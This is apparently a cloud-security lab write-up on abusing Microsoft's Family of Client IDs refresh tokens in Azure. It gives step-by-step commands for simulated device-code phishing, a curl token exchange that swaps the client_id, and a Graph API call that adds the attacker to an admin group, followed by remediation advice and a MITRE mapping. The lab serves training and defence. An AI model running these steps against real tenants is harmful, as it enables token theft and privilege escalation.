# Family of Client IDs (FOCI) Refresh Token Abuse

**Difficulty:** Advanced | **Provider:** Azure | **Category:** Identity / OAuth Token Abuse

## Scenario

Microsoft's **Family of Client IDs (FOCI)** is an undocumented feature that allows a
refresh token obtained for one Microsoft first-party application to be redeemed for an
access token scoped to a **different** first-party application — without re-prompting the
user for consent.

This lab simulates device code phishing to obtain a family refresh token, then demonstrates
how switching the `client_id` can unlock scopes not available to the original application
(e.g., Graph API scopes that allow group membership modification).

> **Note:** Device code phishing is simulated — instead of tricking a real victim, you
> manually enter the device code with the victim's credentials provided by the lab. Tokens
> are cached in `msal_token_cache.json`. Delete this file between runs if needed.

## Attack Path

```
[Attacker] runs:  az login --use-device-code --allow-no-subscriptions
    |
    v
Victim enters code at microsoft.com/devicelogin (simulated)
    |
    v
Family Refresh Token stored in msal_token_cache.json
    |
    v
Exchange RT with new client_id (e.g. Microsoft Office: d3590ed6-...)
    |
    v
New access token with Group.ReadWrite.All scope
    |
    v
POST /v1.0/groups/<admin-group-id>/members/$ref
```

### Step 1 — Obtain the family refresh token

```bash
az login --use-device-code --allow-no-subscriptions
# Visit microsoft.com/devicelogin and enter the provided victim credentials
```

The refresh token is now in `~/.azure/msal_token_cache.json`.

### Step 2 — Exchange for a token with a different client ID

Using [TokenTactics](https://github.com/rvrsh3ll/TokenTactics):

```powershell
Import-Module TokenTactics
$tokens = Invoke-RefreshToMSGraphToken -domain <tenant-domain> -refreshToken <rt>
$tokens.access_token
```

Or manually:

```bash
curl -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=<rt>" \
  -d "scope=https://graph.microsoft.com/.default"
```

### Step 3 — Add yourself to the admin group

```bash
curl -X POST "https://graph.microsoft.com/v1.0/groups/<group-id>/members/\$ref" \
  -H "Authorization: Bearer <access_token>" \
  -H "Content-Type: application/json" \
  -d '{"@odata.id":"https://graph.microsoft.com/v1.0/directoryObjects/<your-user-id>"}'
```

## How to Fix in Production

1. **Use Continuous Access Evaluation (CAE)** to revoke tokens immediately when a user's
   risk level changes or their session is terminated.
2. **Monitor for token redemptions across unusual client IDs** in the Entra ID sign-in
   logs — filter on `clientAppUsed` for unexpected first-party application IDs.
3. **Conditional Access**: Require re-authentication (MFA) for sensitive Graph API
   operations regardless of token validity.
4. **Disable the device code flow** via Conditional Access for users who don't need it.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Steal Application Access Token | [T1528](https://attack.mitre.org/techniques/T1528/) |
| Phishing | [T1566](https://attack.mitre.org/techniques/T1566/) |
| Use Alternate Authentication Material: Application Access Token | [T1550.001](https://attack.mitre.org/techniques/T1550/001/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
